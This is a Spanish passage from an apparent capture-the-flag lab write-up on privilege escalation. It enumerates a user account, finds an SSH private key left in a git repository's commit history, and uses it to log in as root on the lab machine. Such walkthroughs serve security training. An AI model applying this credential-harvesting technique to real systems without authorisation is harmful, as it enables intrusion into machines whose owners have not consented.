## Escalada de privilegios {-}

### Rootear la maquina {-}

```bash
ls -la
id
sudo -l
```

Aqui vemos que el usuario roosa esta en el grupo sudo pero no tenemos su contraseña. Listando los ficheros del usuario **roosa**
vemos que hay muchos ficheros, lo analizamos mas en profundidad.

```bash
find \-type f 2>/dev/null
find \-type f 2>/dev/null | grep -v ".local"
```

Aqui no llama la atencion un directorio que contiene un `.git`. Sabiendo que repositorios **git** contienen un historico de tratamiento
de ficheros nos dirigimos en este proyecto y miramos el historico de comits.

```bash
cd work/blogfeed/
ls -la
git log
```

mirando el historico, vemos un mensaje un poco turbio **reverted accidental commit with proper key**

miramos lo que a passado en este commit. Nos copiamos el identificador del commit.

```bash
git log -p 33e87c312c08735a02fa9c796021a4a3023129ad
```

Aqui vemos que han borrado un key para ponerle otra. La copiamos y de la misma manera que con el usuario roosa, intentamos conectarnos como
root por ssh.

```bash
ssh -i id_rsa2 root@10.10.10.91
```

Y hemos podido entrar... Ya podemos examinar la flag.

